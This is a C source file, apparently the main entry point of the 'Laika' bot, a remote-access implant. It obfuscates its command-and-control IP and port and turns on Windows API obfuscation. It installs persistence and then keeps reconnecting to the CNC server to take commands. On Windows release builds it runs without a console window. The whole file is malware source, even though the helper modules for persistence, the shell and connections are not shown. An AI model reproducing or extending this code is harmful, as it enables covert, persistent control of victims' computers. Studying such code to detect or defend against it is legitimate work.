#include "bot.h"
#include "core/lbox.h"
#include "core/lerror.h"
#include "core/ltask.h"
#include "lconfig.h"
#include "lobf.h"
#include "persist.h"
#include "shell.h"

#include <stdio.h>

/* if LAIKA_PERSISTENCE is defined, this will specify the timeout for 
    retrying to connect to the CNC server */
#define LAIKA_RETRY_CONNECT 5

#ifdef _WIN32
#    ifndef LAIKA_DEBUG_BUILD
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow)
{
#    else
int main()
{
#    endif
#else
int main()
{
#endif
    /* these boxes are really easy to dump, they're unlocked at the very start of execution and left
       in memory the entire time. not only that but they're only obfuscating the ip & port, both are
       things anyone would see from opening wireshark */
    LAIKA_BOX_SKID_START(char *, cncIP, LAIKA_CNC_IP);
    LAIKA_BOX_SKID_START(char *, cncPORT, LAIKA_CNC_PORT);
    struct sLaika_bot *bot;

    /* init API obfuscation (windows only) */
    laikaO_init();

#ifdef LAIKA_PERSISTENCE
    laikaB_markRunning();

    /* install persistence */
    laikaB_tryPersist();
    do {
#endif
        bot = laikaB_newBot();

        LAIKA_TRY
            /* connect to test CNC */
            laikaB_connectToCNC(bot, cncIP, cncPORT);

            /* while connection is still alive, poll bot */
            while (laikaS_isAlive((&bot->peer->sock))) {
                laikaB_poll(bot);
            }
        LAIKA_TRYEND

        /* bot was killed or it threw an error */
        laikaB_freeBot(bot);
#ifdef LAIKA_PERSISTENCE
#    ifdef _WIN32
        Sleep(LAIKA_RETRY_CONNECT*1000);
#    else
        sleep(LAIKA_RETRY_CONNECT);
#    endif
    } while (1);

    laikaB_unmarkRunning();
#endif

    /* vm boxes are left opened */
    return 0;
}